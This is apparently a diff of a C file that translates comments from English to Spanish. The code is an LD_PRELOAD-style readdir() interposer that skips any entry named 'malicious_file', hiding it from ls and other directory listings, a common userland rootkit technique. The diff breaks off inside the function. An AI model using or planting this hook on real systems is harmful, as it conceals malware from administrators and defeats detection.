@@ -4,19 +4,21 @@
 #include <dlfcn.h>
 #include <dirent.h>
 #include <string.h>
-// Function pointer typedef for the original readdir ls function
+
+
+// Puntero de función typedef para la función readdir ls original
 typedef struct dirent* (*ls_t)(DIR*);
-// Interposed ls function
+// función ls interpuesta
 struct dirent* readdir(DIR* dirp) {
-  // Get the original readdir address
+  // Obtener la dirección readdir original
   ls_t original_readdir = (ls_t)dlsym(RTLD_NEXT, "readdir");
   struct dirent* entry;
   do {
-    // Call the original ls function to get the next directory entry
+    // Llama a la función ls original para obtener la siguiente entrada del directorio
     entry = original_readdir(dirp);
-    // Check if the entry is the file we want to hide
+    // Comprobamos si la entrada es el archivo que queremos ocultar
     if (entry != NULL && strcmp(entry->d_name, "malicious_file") == 0) {
-      // Skip the file by calling the original ls function again
+      // Omite el archivo llamando nuevamente a la función ls original
       entry = original_readdir(dirp);
     }
   } while (entry != NULL && strcmp(entry->d_name, "malicious_file") == 0);
